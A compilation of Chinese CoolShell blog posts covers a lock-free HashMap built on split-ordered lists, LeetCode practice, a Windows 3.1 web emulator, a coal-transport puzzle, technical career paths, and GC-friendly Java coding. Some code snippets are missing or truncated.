当计算counter新值时，若其他线程将counter的值改变，compareAndSwap就会失败。此时我们只需在外面加一层循环，不断尝试这个过程，那么最终一定会成功将counter值+1。（其实AtomicInteger已经为常用的+1/-1操作定义了incrementAndGet与decrementAndGet方法，以后我们只需简单调用它即可）除了AtomicInteger外，java.util.concurrent.atomic包还提供了AtomicReference和AtomicReferenceArray类型，它们分别代表原子性的引用和原子性的引用数组（引用的数组）。#### 无锁链表的实现在实现无锁HashMap之前，让我们先来看一下比较简单的无锁链表的实现方法。以插入操作为例：1. 首先我们需要找到待插入位置前面的节点A和后面的节点B。   2. 然后新建一个节点C，并使其next指针指向节点B。（见图1）   3. 最后使节点A的next指针指向节点C。（见图2）但在操作中途，有可能其他线程在A与B直接也插入了一些节点（假设为D），如果我们不做任何判断，可能造成其他线程插入节点的丢失。（见图3）我们可以利用CAS操作，在为节点A的next指针赋值时，判断其是否仍然指向B，如果节点A的next指针发生了变化则重试整个插入操作。大致代码如下：
(Node类的next字段为AtomicReference<Node>类型，即指向Node类型的原子性引用)无锁链表的查找操作与普通链表没有区别。而其删除操作，则需要找到待删除节点前方的节点A和后方的节点B，利用CAS操作验证并更新节点A的next指针，使其指向节点B。#### 无锁HashMap的难点与突破HashMap主要有 **插入** 、 **删除** 、 **查找** 以及 **ReHash** 四种基本操作。一个典型的HashMap实现，会用到一个数组，数组的每项元素为一个节点的链表。对于此链表，我们可以利用上文提到的操作方法，执行插入、删除以及查找操作，但对于ReHash操作则比较困难。如图4，在ReHash过程中，一个典型的操作是遍历旧表中的每个节点，计算其在新表中的位置，然后将其移动至新表中。期间我们需要操纵3次指针：1. 将A的next指针指向D   2. 将B的next指针指向C   3. 将C的next指针指向E而这三次指针操作必须同时完成，才能保证移动操作的原子性。但我们不难看出，CAS操作每次只能保证 **一个** 变量的值被原子性地验证并更新，无法满足同时验证并更新三个指针的需求。
于是我们不妨换一个思路，既然移动节点的操作如此困难，我们可以使所有节点始终保持有序状态，从而避免了移动操作。在典型的HashMap实现中，数组的长度始终保持为2i，而从Hash值映射为数组下标的过程，只是简单地对数组长度执行取模运算（即仅保留Hash二进制的后i位）。当ReHash时，数组长度加倍变为2i+1，旧数组第j项链表中的每个节点，要么移动到新数组中第j项，要么移动到新数组中第j+2i项，而它们的唯一区别在于Hash值第i+1位的不同（第i+1位为0则仍为第j项，否则为第j+2i项）。如图5，我们将所有节点按照Hash值的翻转位序（如1101->1011）由小到大排列。当数组大小为8时，2、18在一个组内；3、11、27在另一个组内。每组的开始，插入一个哨兵节点，以方便后续操作。为了使哨兵节点正确排在组的最前方，我们将正常节点Hash的最高位（翻转后变为最低位）置为1，而哨兵节点不设置这一位。当数组扩容至16时（见图6），第二组分裂为一个只含3的组和一个含有11、27的组，但节点之间的相对顺序并未改变。这样在ReHash时，我们就不需要移动节点了。#### 实现细节由于扩容时数组的复制会占用大量的时间，这里我们采用了将整个数组分块，懒惰建立的方法。这样，当访问到某下标时，仅需判断此下标所在块是否已建立完毕（如果没有则建立）。
另外定义size为当前已使用的下标范围，其初始值为2，数组扩容时仅需将size加倍即可；定义count代表目前HashMap中包含的总节点个数（不算哨兵节点）。初始时，数组中除第0项外，所有项都为null。第0项指向一个仅有一个哨兵节点的链表，代表整条链的起点。初始时全貌见图7，其中浅绿色代表当前未使用的下标范围，虚线箭头代表逻辑上存在，但实际未建立的块。##### 初始化下标操作数组中为null的项都认为处于未初始化状态，初始化某个下标即代表建立其对应的哨兵节点。初始化是递归进行的，即若其父下标未初始化，则先初始化其父下标。（一个下标的父下标是其移除最高二进制位后得到的下标）大致代码如下：Node dummy = new Node();     dummy.hash = Integer.reverse(bucketIdx);     dummy.next = new AtomicReference&lt;&gt;();setBucket(bucketIdx, listInsert(getBucket(parentIdx), dummy));     }其中getBucket即封装过的获取数组某下标内容的方法，setBucket同理。listInsert将从指定位置开始查找适合插入的位置插入给定的节点，若链表中已存在hash相同的节点则返回那个已存在的节点；否则返回新插入的节点。
##### 插入操作* 首先用HashMap的size对键的hashCode取模，得到应插入的数组下标。   * 然后判断该下标处是否为null，如果为null则初始化此下标。   * 构造一个新的节点，并插入到适当位置，注意节点中的hash值应为原hashCode经过位翻转并将最低位置1之后的值。   * 将节点个数计数器加1，若加1后节点过多，则仅需将size改为size*2，代表对数组扩容（ReHash）。##### 查找操作* 找出待查找节点在数组中的下标。   * 判断该下标处是否为null，如果为null则返回查找失败。   * 从相应位置进入链表，顺次寻找，直至找出待查找节点或超出本组节点范围。##### 删除操作* 找出应删除节点在数组中的下标。   * 判断该下标处是否为null，如果为null则初始化此下标。   * 找到待删除节点，并从链表中删除。（注意由于哨兵节点的存在，任何正常元素只被其唯一的前驱节点所引用，不存在被前驱节点与数组中指针同时引用的情况，从而不会出现需要同时修改多个指针的情况）   * 将节点个数计数器减1。#### 参考文献《Split-Ordered Lists: Lock-Free Extensible Hash Tables》
（全文完）# Leetcode 编程训练作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn!LeetCodeLogo \(1\)Leetcode这个网站上的题都是一些经典的公司用来面试应聘者的面试题，很多人通过刷这些题来应聘一些喜欢面试算法的公司，比如：Google、微软、Facebook、Amazon之类的这些公司，基本上是应试教育的功利主义。我做这些题目的不是为了要去应聘这些公司，而是为了锻炼一下自己的算法和编程能力。因为我开始工作的时候基本没有这样的训练算法和编程的网站，除了大学里的“算法和数据结构”里的好些最基础最基础的知识，基本上没有什么训练。所以，当我看到有人在做这些题的时候，我也蠢蠢欲动地想去刷一下。于是，我花了3-4个月的业余时间，我把Leetcode的154道题全部做完了。（这也是最近我没有太多的时间来写博客的原因，你可以看到我之前做的那个活动中有几个算法题来自于Leetcode）有人说我时间太多了，这里声明一下，我基本上都是利用了晚上10点以后的时间来做这些题的。LeetCode的题大致分成两类：**1）基础算法的知识** 。这些题里面有大量的算法题，解这些题都是有套路的，不是用递归（深度优先DFS，广度优先BFS），就是要用动态规划（Dynamic Programming），或是拆半查找（Binary Search），或是回溯（Back tracing），或是分治法（Divide and Conquer），还有大量的对树，数组、链表、字符串和hash表的操作。 **通过做这些题能让你对这些最基础的算法的思路有非常扎实的了解和训练** 。对我而言，Dynamic Programming 是我的短板，尤其是一些比较复杂的问题，在推导递推公式上总是有思维的缺陷（数学是我的硬伤），通过做了这些题后，我能感到我在DP的思路上有了很大的收获。
**2）编程题** 。比如：atoi，strstr，add two num，括号匹配，字符串乘法，通配符匹配，文件路径简化，Text Justification，反转单词等等，这些题的Edge Case, Corner Case有很多。这些题需要你想清楚了再干，只要你稍有疏忽，就会有几个case让你痛不欲生，而且一不小心就会让你的代码会写得又臭又长，无法阅读。 **通过做这些题，可以非常好的训练你对各种情况的考虑，以及你对程序代码组织的掌控（其实就是其中的状态变量）。** 还记得我在《函数式编程》中说的，程序中的状态是你程序变得复杂难维护的直接原因。我觉得每个程序员都应该花时间和精力做这些题，因为你会从这些题中得到很大的收益。做完这些题后你一定会明白下面几个道理：**1）想清楚了再干** 。这个观点我以前就在《多些时间可以少些代码》说过。如果你拿到题就上去直接写代码的话，你一定会被各种case打回来了。然后呢，你一着急，你就会进入那种我在《开发团队的效率》中说的那种毫无效率case by case的开发模式，而你也进入了“平庸模式”。于是你就会出现下图那样的情况。!Case-by-Case DevelopementCase-by-Case Development
**2) 编程是脑力劳动，急不得** 。这个事情在这做这些题的时候你就会发现，要么是脑子转不过来了，要么就是明明就差一点了，但程序怎么都调不对。如果你越着急的话，你就会发现你会离目标越远，而花的时间也会更多。另外，你会发现这些题基本上都是50行代码内就可以搞定的，但是为了这50行以内的代码，你要花好多时间和精力。coding 50行代码在我们的日常工作中分分钟就完成，而Leetcode里的50行代码却没那么简单，也许，用这个你就可以区别什么是码农，什么是程序员了。**3）加班要不得。** 因为我总是在晚上10点以后做题，所以，基本上都是在加班状态中工作。这种状态过上两三天，你就会发现，整个大脑已经不转了，而且不但不转，还会犯很多低级错误，很多事情都想不清楚，一个晚上都在和程序的状态控制做搏斗，代码写得越来越乱，越来越没条理。于是这种时候，我都会休息几天，不做题了，然后再做题的时候，就觉得非常地清楚。可见加班 是编程最致命的敌人！我把我的C++代码放到了Github上，大家也帮我review一下，看看有没有可以改善的。****好了，不多说了， **我希望大家有时间都去练练LeetCode，无论是找工作还是对你的编程能力会有非常大的提高** 。
（全文完）# 一个Windows 3.1的Web网站作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn啥也不说了，请大家围观下面这个网站吧。**http://www.michaelv.org/**打开这个网站，你会看到N年前DOS时代的Windows 3.1的界面，居然还可以扫雷，呵呵。真应了那句话——“只要是可以被Javascript实现的应用或程序，最终都会被Javascript所实现”。另，关于其它Web上更为疯狂的程序，可以查看本站的这篇文章。还有这个在线的IDE。下面是win3.1的截图：# 面试题：火车运煤问题作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn这个可能是一个比较经典的智力题了，和以前的那个《赛马问题》很相似，其题目如下：**你是山西的一个煤老板，你在矿区开采了有3000吨煤需要运送到市场上去卖，从你的矿区到市场有1000公里，你手里有一列烧煤的火车，这个火车最多只能装1000吨煤，且其能耗比较大——每一公里需要耗一吨煤。请问，作为一个懂编程的煤老板的你，你会怎么运送才能运最多的煤到集市？**
这道题一开始看上去好像是无解的，因为你的火车每一公里就要消耗一吨煤，而到目的地有1000公里，而火车最多只能装1000吨媒。如果你的火车可以全部装下，到目的地也会被全部烧光，一丁点也不剩。所以，很多人的第一反应都是觉得这个不太可能。如果你一开始就觉得不太可能的话，这是很正常的。不过我不知道你还会不会继续思考下去，如果你不想思考下去了，那么我很为你担忧，因为你可能并不是一个不善于思考的人，而是一个畏难的人，还有可能是一个容易放弃的人。这对于你做好 一个需要大量思考的工作的程序员来说可能并不适合。我一开始也觉得不可能，后来想了一想，想到一个解法可以最多运送500吨煤到市场，方法如下：（希望你先自己想一想再查看这个答案）【 **查看答案**;)】1. 装1000吨煤，走250公里，扔下500吨煤，回矿山。   2. 装1000吨煤，走到250公里处，拿起250吨煤继续向前到500公里处，扔下500吨煤，回矿山。此时火车上还有250吨，再加上在250公里处还有250吨煤，所以，火车是可以回矿山的。   3. 装上最后1000吨煤，走到500公里处，装上那里的500吨煤，然后一直走到目的。于是，你最多可以运送500吨煤到市场（当然，火车也回不去了，因为那矿山没有煤了）
好像这样很不错的了，不过还有更好的方法能运更多的媒过去。你知道这个方法吗？可以提示的是，就是以上述这个方法的思路。我先暂时不把答案放上来，你可以自己想想。过两天我把答案放上来。**更新（2011年4月17日）** ：大家都很聪明，533是应该是最优解，大家用了很多种方法阐述了这一过程，我最初的想法和朋友xPacificCoolShell的一致！很高兴看到有更为科学的解法，受教了。另外，还有一些朋友提出火车不能随时随地调头的实际情况，非常不错，所以，以后这题不能用火车运煤了，可能是用马运草更好一点了。;)# 技术人员的发展之路作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn2012年的时候写过一篇叫《程序算法与人生选择》的文章，我用算法来类比如何做选择，说白了就是怎么去计算，但是并没有讲程序员可以发展的方向有哪些。 所以，就算是有这些所谓的方法论，我们可能对自己的发展还是会很纠结和无所事从，尤其是人到了30岁，这种彷徨和迷惑越来越重。虽然我之前也写过一篇《编程年龄和编程技能》的文章，但是还是有很多做技术的人对于自己能否在年纪大时还能去做技术感到没有信心。我猜测，这其中，最大的问题的是，目前从事技术工作的种种负面的经历（比如经常性的加班，被当成棋子或劳动力等等），让人完全看不到希望和前途，尤其是随着年纪越来越大，对未来的越来越没有信心。
同时，也是因为在GIAC的大会被问到，程序员老了怎么办？而在年底这段时间，也和几个朋友在交流中不断地重复谈到个人发展的这个话题。我的人生过半，活到“不惑”的年纪，自然经常性的对什么事都会回头看看总结归纳，所以，在交谈过程中和交谈过后，自己也有一些思考想记录下来。因为我本人也是在这条路上的人，所以，谈不上给他人指导，我同样也是在瞎乱折腾同样每天在思考自己要去哪儿的“一尘世间迷途老生”。况且，我的经历和眼界非常有限，因此，下面的这些关于个人发展的文字和思考必然是受我的眼界和经历所局限的。也欢迎大家补充和指正。这些东西不一定对，也不一定就是全部，期许可以让你在年底的时候有所思考，在明年的时候有所计划。目录* 一个重要阶段和标志   * 个人发展的三个方向   * 一、在职场中发展     * 1、去顶尖公司     * 2、去真正的创业公司     * 3、职业生涯的发展阶段   * 二、追求人生的经历   * 三、追求自由的生活   * 总结#### 一个重要阶段和标志在讲个人发展之前，我需要先说一下人生中的一个非常重要的阶段—— **20到30岁！****这个阶段的首要任务，就是提升自己学习能力和解决难题的能力。** **这是一个非常非常关键的时间段！这个时间段几乎决定着你的未来。**
30岁以前，这个时间段，应该是人学习和积累的时间段，这个时间段，就是努力学习的时间段。这个时间段，你一定要把时间花在解决问题的技能上。就是说，你一定要练就成的技能是——你能解决大多数人不能解决的问题。使蛮力埋头加班苦干，当一个搬砖老黄牛的是肯定没有前途的。如果你不幸呆在了一个搬砖的地方，天天被业务压得喘不过气来，我建议你宁可让你的项目延期被老板骂，也要把时间挤出来努力学习基础知识，多掌握一些技术（很多技术在思路上是相通的），然后才能有机会改变自己目前的状况。因为，比起你的个人未来，项目延期被老板骂、绩效不好拿不到奖金，都不是什么事儿。总结一下，你在30岁前，工作5-7年，你需要拥有：* **高效的学习能力** 。这意味着——基础知识扎实、触类旁通、读英文文档不费劲、有寻找前沿知识的能力、能够看到问题和技术的本质、善于思辩、能独立思考。* **解决问题的能力** 。这意味着——你要高效的学习能力、见过很多的场景、犯过或是处理很多错误、能够防火而不是救火。如果你拥有这两个能力的现象是—— **在团队或身边的人群中的显现出Leadership** 。Leadership并不是当领导和经理，而是一种特征，这种特征有如下两个简单的表象：
* **帮人解问题** 。团队或身边中大多数人都在问：“这问题怎么办？”，而总是你能站出来告诉大家这事该怎么办？* **被人所依赖** 。团队或身边中大多数人在做比较关键的决定时，都会来找你咨询你的意见和想法。一但你在在30岁之间出现了Leadership这样的特征，那么，你会进入一个正循环的阶段：* 因为你学习能力强，所以，你会有更多的机会解决难题。   * 你有更多的机会解决难题，你就会学更多的东西，于是你就会更强。   * 上面这个循环，只要循环上几年，就会让你人生的各种可能性大大的增加。**【 注意 】*** 要达到这样的特质，需要找到自己的长处、以及适合自己的环境。就像鱼的特长是呆在水里，让鱼儿去追求陆上动物的刺激生活并不靠谱。* 一般说来，有这样的潜质的人，在学校中就应该要出现。如果你在大学中还没有出现这样的潜质，那么，你在工作当中要加倍努力了（注：所谓的加倍努力，不是让你使蛮力加班，而是让你多学习成长，使蛮力拼命是弥补不了能力、思维、眼界上的缺陷的）。* Leadership也有范围的，比如，身边的朋友，工作中的团队/部分，圈内，整个行业。Leadership的范围越大，你的个人发展的选择性就越高。反之则越小。
* 如果已到了30岁左右，还是没有出现这样的特征。那么，可能未来你也很难有这样的Leadership了。而你的个人发展的可能性可能也就不多了（sigh…）**读到这里，我必需要说一下，如果你已开始显现出你的Leadership，那么你才谈得上个人发展，这篇文章后续的内容也可能才会对你有意义** 。#### 个人发展的三个方向以我个人短浅的经历和视野，目前只看到的人的发展有如下三个大方向（他们之间可能会有重叠）：1） **在职场中打拼**2） **去经历有意义有价值的事**3） **追求一种自由的生活**这三个方向，我个人或多或少都体验过，我也见过身边的很多人走这三个方向走的比较成功。也许还有别的方向，没办法，现在，我的视野就这么大，所以，我在这里，我主要就是谈谈这三个方向。Again， **人有资格去走这三个方向的前提是——已有了上面我说的Leadership那种特质！**#### 一、在职场中发展在职场中发展应该是绝大多数人的选择。通过加入公司来达到人生的发展。我们经常可以看到很多所谓的“职业规划”，但是大多数职业规划只不过人力资源搞出来的东西，和实际其实是有很大出入的。我的人生经历中，有18年左右是在公司中度过的，在过银行，小公司，大公司，民营公司，外国公司，传统IT公司，互联网公司，不同的公司完全有不同的玩法和文化，我的经历还算丰富，但也不算特别成功，这里只分享一些我在职场中的心得（不一定对，仅供参考）。
##### 1、去顶尖公司**去顶尖公司的一个目的就是让你的Leadership的范围的可能性扩大** 。因为公司和公司的差距也不小，所以，就算你在低端公司里是骨干份子，但在高端公司里可能只是一个普通员工（就像中国足球队的主力到了英超可能都无法入选）。所以，在职场中，如果你要让你的个人价值最大化的话，你一定要去顶尖的公司。因为顶尖公司里有非常不错的工作方法和场景，这并不是能看书或是交流得来的，这是必需要去亲身体验的。所以说，在顶尖公司掌握的技能，开阔的眼界，通常来说都会比低端公司的要多得多。另外，每个公司的工作级别都是有相互对标的，比如：阿里的P几对应于百度的T几。国内的一线公司职位还相当，但是如果和国外一线公司的比，那就有差距了，而且差距还很大。比如，Google或Facebook的某个高级工程师，可能就对应于阿里的P8/P9甚至更高。是的，对于职场来说，如果你在顶尖公司是骨干，那么，你去低端公司，则有很大机会会成为他们高管和核心。就好像你在Facebook里干三五年成为他们的技术骨干，那么你到BAT去成成为高管概率是非常大的。反过来，如果你毕业主去了BAT成为了一个螺丝钉，在天天加班中度过你的青春，你干个十年能成为BAT的高管的概率可能会非常的低。
##### 2、去真正的创业公司去顶尖公司和去创业公司在某些时候并不冲突。不过，这里我想讲的是，一个技术能力强的人在大公司可能会被埋没掉。因为大公司业务成功后，* 成功的公司在招聘各种高级技术人才都不会成为问题，于是少你一个不少，多你一个不多。* 成功的公司其整个技术体系已经完成，Legacy的问题也比较多，所以，可以供你发挥的余地不大。* 成功的公司更多的可能会想要稳定的系统，稳定必然会产生保守，而保守则产生不思进取。所以，对于中高级人才来说，在大公司里的能产生的个人价值，可能远远不如那些求贤若渴、没有包袱、可以尽情施展、相对更为灵活和自由的创业型公司。不过，去创业公司需要小心仔细的挑选和评估，创业公司的不确定因素很多，也和创始人的因素太大了，所以，你需要小心了解创始人和他们的业务情况，想法和理念差不多才能更好的共事。好多创业公司其实并不是真正的创业公司，他们创业有很大的侥幸和驱利心理，要小心甄别。因为那不是真正的创业公司。##### 3、职业生涯的发展阶段首先，有一个不争事实—— **整个社会是会把最重要的工作交给30岁左右的这群人的。也就是说，30岁左右这群人是这个社会的做事的中坚力量。**
所以，这是一个机遇！如果你有了Leadership，你就一定能在这个时间段内赶得上这个机遇——公司和领导对你寄于信任和厚望，并把重要的团队和工作交给你。于是，你的30岁到40岁就成了一个职业生涯的发展期，也就是你的事业上升期。如果你到40岁都没有赶上，那么你的职业生涯也就这样了，老有所成的人是少数。在你事业的上升期，你需要更多的软技能，比如：* 带领产品和业务的发展的能力   * 推行自己喜欢的文化的能力   * 项目管理的能力——在任务重、时间紧中求全   * 沟通和说服别人的能力   * 解决冲突的能力   * 管理和发展团队的能力   * 解决突发事件的应急能力   * …… ……另外，你还要明白在职场里的几个冷酷的事实：* **你开始要关心并处理复杂的人事** 。尤其在大公司，大量的人都是屁股决定脑袋，利益关系复杂，目标不一致，每个人心里都有不一样的想法。这个时候再也不是talk is cheap, show me the code！而是，code is cheap，talk is the matter。你需要花大量的时间去思考和观察形形色色的人。需要耗费大量的精力在不同的人之间周旋，而不是花时间去创造些什么有价值的东西。
* **你要开始学会使用各种政治手段** 。办公室政治不可避免，越大的公司越重，自从你开始成为一线的leader的那一天起，你就开始成为“里外不是人”的角色，需要在下属和领导，员工和公司之间周旋。随而你的级别越来越高，你需要使用更多的政治手段，你会学会审时度世的站队，学会迎合员工和领导，学会用官员的语言说话，学会此一时彼一时，学会妥协和交换，学会忍气吞声，学会在在适当的时机表现自己，学会波澜不惊，学会把自己隐藏起来，甚至你还会迷失自我，开始学会一些厚黑学，比如不得不在适当的时机在背后捅人刀子……你可能会成为一个你自己都讨厌的人听上去真的好无聊，所以，你现在也明白为什么高层们都看上去很忙很累，而且抽不出时间来关心细节问题，因为，他们更多的是要协调整个组织和系统来运转，甚至还要四处周旋，各种博弈，没办法，这是职场的必需的东西！听起来是不是感觉人类很愚蠢？这真是没办法的事。如果你不想或是也没有能力玩这些东西，那么你需要去那些可以让技术人员安安心心做技术的公司。这类的公司，我见过Microsoft、Google、Amazon或是一些创业公司里都有。国内的大公司中也有让技术人员成长的职业成长线，但老实说，表面上看似是一个让人专心做技术的升职成长线，但其实还是管理岗位。
所以， **技术人员在职场中的归宿有两条路 —— 到真正的技术公司成为一个专心做技术的人，或是在成为一个职业的经理人** 。#### 二、追求人生的经历先说三个故事，* 第一个，是在阿里的时候，有一天在内网里看到一个贴子，一个做产品的女孩说自己准备离职要去法国学烘培厨艺，引得大家热评。* 第二个，是在亚马逊的美国老板，他每年都要去报个培训班学一个技能，比如：厨艺、开双翼飞机、夜总会里的DJ……、甚至去华盛顿去学当一个政客。* 第三个，是在汤森路透工作时，一个英国的同事，有一天他说他离职了，和自己的老婆准备用余生去周游世界，我问他是不是有足够多的钱了？他和我说，钱不够，他俩口子的计划是，边旅游边打工，打工打够到下一站的钱就走。他还说，那种用假期去另一个城市的旅游太没意思了，如果你不在那个地方生活上一段时间 ，你怎么能算是好的旅游体验呢？好吧，无法反驳。我是觉得他们把自己的人生过得如此有意思，令我很佩服。虽然跨界跨得有点猛，但是 Why Not？在这里，我想说，去追求一种和众人不一样的人生经历也是一件挺好的事，我个人感觉，比起在职场里有趣地多多了。如果你厌倦了职场，其实为什么不去追求一下不同的人生经历呢。就算你不想去追求跨度比较大的人生经历，那么，在技术圈里，也有很多有价值有意思的经历也可以去的。 **追求刺激有意义的与众不同的经历的人，其实也能算是一种人生的成功，不是吗？**
如果只说技术方面，我个人看到的去追求经历的人，有两种追求的人其实也很成功的：* **到技术创新的发源地去经历创新** 。计算机互联网各种技术的创新引擎，基本上来说，就是在美国了。我们赶上了这个时代，也选对了这个时代最火热的行业，那么，有什么理由不去这个时代的技术发动机那里去经历呢？在美国硅谷湾区，无论是大公司，还是创业公司，都在迸发着各式各样的创新，如果有能力有机会，为什么不努力去经历一下呢？不经历一下，老了不会觉得错过了是一种后悔吗？* **去经历下一个热点技术的发展** 。从IT，到互联网、再到移动互联网、云计算、大数据，再到未来的AI，VR，IoT……，技术创新的浪潮一波接一波的过来，你是想在那继续搬砖搬下去，是想迎浪而上去经历浪潮，还是想成为一个随波逐流的人？打工也好，创业也好，在国内也好，在国外也好，这些都是形式，不是内容。内容则是你有没有和有想法的人去经历有意义有价值事？人生苦短，白驹过隙，我们技术人员最大的幸运就是生在这样一个刺激的时代，那么，你还有什么理由不去追逐这些前沿刺激的经历呢？#### 三、追求自由的生活我相信“自由”这个事，是所有人的心中都会想去追求的。“生命诚可贵，爱情价更高，…… ”（哈哈）
但一说起自由，绝大多数人都想到的是“财富自由”或是“财务自由”，其实，并不完全是这样的，在自由的通路上，我个人的经历告诉我，其实，你会有很多的不同类型的自由。下面，是我对几个层次的“自由”的理解。**第一层自由——工作自由** 。人的第一层自由的境界是——“工作自由”，我到不是说你在工作单位上可以很自由，虽然有特例，但并不普遍。我想说的“工作自由”是——你不会有失业危机感了。也就是说，你成了各个公司的抢手货，你不但不愁找不到工作，而且你是完全不愁找不到好工作。试想一下，如果是工作来找你，一方面，你就有真正意义上的工作选择权了，另一方面，你都不愁工作了，你完全就可以随时离职去干你想干的事了。此时，你就达到了“工作自由”。**第二层自由——技能自由** 。工作自由已是不错，不过前提是你还是需要依赖于别人提供的工作机会。而技能自由则是你可以用自己的技能养活自己，而不需要去公司里工作。也就是所谓的自由职业者了，社会上，这样的人也不少，比如，一些健身体育教练、设计师、翻译者、作者……这些都可以算是自由职业者，程序员这个职业中只要不是搬砖的，有想法的，就有可以成为自由积业者的潜质，想一想，你拥有的编程能力，其实是一种创造的能力，也就是创造力，只要你Make Something People Want（YC创业公司的slogan），你是完全可以通过自己的技能来养活自己的。如果你通过某些自动化的东西，或是你在App上做了一个软件个体户，让自己的收入不断，甚至你做了一个开源软件，社区每个月都给你捐款捐到比你打工挣的还多，那么你就真正的有了技能自由了。
**第三层自由——物质自由。** 我把财务自由换了一种说法。我个人觉得，除了有个好爸爸之外这种特例的情况，如果你想有物质自由的话，本质上来说，你一定要学会投资，投资不一定是你的钱，时间也是一种财富，年轻更是，你怎么投资你的时间还有你的青春？你要把你的投资投到什么样的事，什么样的人？对于投资这个事，风险也比较大。但是，人生不敢冒险可能才是最大的冒险。这个世界有很多技术不是你能看书学来的，而要只能在实战中学会的，比如：游泳。投资可能也是一种。只有真正懂投资的人，或是运气非常好的人，才可能实现物质自由。追求自由的生活，其实也是个人发展道路上的一个不错的选择。通常来说，自由的人，能力都不差，钱也不会少。因为，他们懂得投资。也就是说，拥有追求自由能力的的人，* 不但有领导力和创造力（也可指导大多数人并走在大多数人前面）   * 同时他还懂得怎么投资（知道时间和精力和金钱应该投在什么地方）（注：这里我没有提精神自由，老实说，精神上的自由我也不清楚是什么东西，因为我还没有见过，眼界有限，所以先按不表了，不然真成鸡汤文了）#### 总结无论是在职场中打拼，还是追求精彩的经历，还是去实现自由，我觉得都是不错的个人发展的方向。
他们都有重叠，比如：* 你可以在职场中去追求那些刺激的经历的公司。   * 同样也可以通过加入有潜力高速发展的公司来达到自由。   * 你也可以通过追寻不一样的经历来达到人生的自由。   * ……**总之，这里的逻辑是——*** **能够去规划自己的个人发展的人，通常都是有很多机会和可能性的人** 。* **有很多机会和可能性的人，通常都是有Leadership，喜欢冒险的人。*** **有Leadership喜欢冒险的人，通常都是学习能力强，思维活跃，喜欢折腾，懂得“投资”的人。*** **学习能力强思维活跃的人，通常来说，都是喜欢看书，喜欢实践和新鲜事物，不怕艰难和挑战，用智力而不是使蛮力的人。*** **懂得“投资”的人，通常来说，他们更多的关注的是未来和长远的成长，而不是当下的KPI、奖金和晋升。**!电影《飞屋环游记》插图来自电影《飞屋环游记》**最后祝大家新年快乐，来年大展鸿图。**（全文完）# 面向GC的Java编程作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**（感谢网友@Hesey小纯纯 投稿 博客 | 原文链接）**
Java程序员在编码过程中通常不需要考虑内存问题，JVM经过高度优化的GC机制大部分情况下都能够很好地处理堆(Heap)的清理问题。以至于许多Java程序员认为，我只需要关心何时创建对象，而回收对象，就交给GC来做吧！甚至有人说，如果在编程过程中频繁考虑内存问题，是一种退化，这些事情应该交给编译器，交给虚拟机来解决。这话其实也没有太大问题，的确，大部分场景下关心内存、GC的问题，显得有点“杞人忧天”了，高老爷说过：过早优化是万恶之源。但另一方面， **什么才是“过早优化”？**If we could do things right for the first time, why not?事实上 **JVM的内存模型** ( JMM )理应是Java程序员的基础知识，处理过几次JVM线上内存问题之后就会很明显感受到，很多系统问题，都是内存问题。对JVM内存结构感兴趣的同学可以看下 浅析Java虚拟机结构与机制 这篇文章，本文就不再赘述了，本文也并不关注具体的GC算法，相关的文章汗牛充栋，随时可查。另外，不要指望GC优化的这些技巧，可以对应用性能有成倍的提高，特别是对I/O密集型的应用，或是实际落在YoungGC上的优化，可能效果只是帮你减少那么一点YoungGC的频率。
但我认为， **优秀程序员的价值，不在于其所掌握的几招屠龙之术，而是在细节中见真著** ，就像前面说的， **如果我们可以一次把事情做对，并且做好，在允许的范围内尽可能追求卓越，为什么不去做呢？**目录* 一、GC分代的基本假设   * 二、对象分配的优化   * 三、不可变对象的好处   * 四、引用置为null的传说   * 五、手动档的GC   * 六、指定容器初始化大小   * 七、对象池   * 八、对象作用域   * 九、各类引用#### 一、GC分代的基本假设大部分GC算法，都将堆内存做分代(Generation)处理，但是为什么要分代呢，又为什么不叫内存分区、分段，而要用面向时间、年龄的“代”来表示不同的内存区域？GC分代的 **基本假设** 是：**绝大部分对象的生命周期都非常短暂，存活时间短。**而这些短命的对象，恰恰是GC算法需要首先关注的。所以在大部分的GC中，YoungGC（也称作MinorGC）占了绝大部分，对于负载不高的应用，可能跑了数个月都不会发生FullGC。基于这个前提，在编码过程中，我们应该 **尽可能地缩短对象的生命周期** 。在过去，分配对象是一个比较重的操作，所以有些程序员会尽可能地减少new对象的次数，尝试减小堆的分配开销，减少内存碎片。
但是，短命对象的创建在JVM中比我们想象的性能更好，所以，不要吝啬new关键字，大胆地去new吧。当然前提是不做无谓的创建，对象创建的速率越高，那么GC也会越快被触发。结论：* 分配小对象的开销分享小，不要吝啬去创建。   * GC最喜欢这种小而短命的对象。   * 让对象的生命周期尽可能短，例如在方法体内创建，使其能尽快地在YoungGC中被回收，不会晋升(romote)到年老代(Old Generation)。#### 二、对象分配的优化基于大部分对象都是小而短命，并且不存在多线程的数据竞争。这些小对象的分配，会优先在线程私有的 **TLAB** 中分配，TLAB中创建的对象，不存在锁甚至是CAS的开销。TLAB占用的空间在Eden Generation。当对象比较大，TLAB的空间不足以放下，而JVM又认为当前线程占用的TLAB剩余空间还足够时，就会直接在Eden Generation上分配，此时是存在并发竞争的，所以会有CAS的开销，但也还好。当对象大到Eden Generation放不下时，JVM只能尝试去Old Generation分配，这种情况需要尽可能避免，因为一旦在Old Generation分配，这个对象就只能被Old Generation的GC或是FullGC回收了。
#### 三、不可变对象的好处GC算法在扫描存活对象时通常需要从ROOT节点开始，扫描所有存活对象的引用，构建出对象图。不可变对象对GC的优化，主要体现在Old Generation中。可以想象一下，如果存在Old Generation的对象引用了Young Generation的对象，那么在每次YoungGC的过程中，就必须考虑到这种情况。Hotspot JVM为了提高YoungGC的性能，避免每次YoungGC都扫描Old Generation中的对象引用，采用了 **卡表(Card Table)** 的方式。简单来说，当Old Generation中的对象发生对Young Generation中的对象产生新的引用关系或释放引用时，都会在卡表中响应的标记上标记为脏(dirty)，而YoungGC时，只需要扫描这些dirty的项就可以了。可变对象对其它对象的引用关系可能会频繁变化，并且有可能在运行过程中持有越来越多的引用，特别是容器。这些都会导致对应的卡表项被频繁标记为dirty。而不可变对象的引用关系非常稳定，在扫描卡表时就不会扫到它们对应的项了。注意，这里的不可变对象，不是指仅仅自身引用不可变的final对象，而是真正的 **Immutable Objects** 。
